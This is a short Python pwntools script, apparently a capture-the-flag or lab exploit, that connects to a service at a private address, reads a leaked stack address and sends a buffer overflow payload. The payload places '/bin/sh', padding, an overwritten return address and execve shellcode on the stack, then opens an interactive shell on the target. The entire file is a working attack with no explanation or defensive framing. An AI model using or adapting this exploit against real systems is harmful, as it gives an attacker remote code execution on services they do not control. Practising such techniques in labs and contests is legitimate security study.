from pwn import *

r = remote("192.168.0.8", 12345)

context.arch = 'amd64'

r.recvuntil('0x')
data = r.recvuntil('\n')
a_addr = int(data, 16)

input('Paused')

shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, {}
    xor rax, rax
    mov al, 59
    syscall
'''.format(hex(a_addr)))

r.sendline(b'/bin/sh\x00' + b'a'*10+p64(a_addr+18+8) + shellcode)

r.interactive()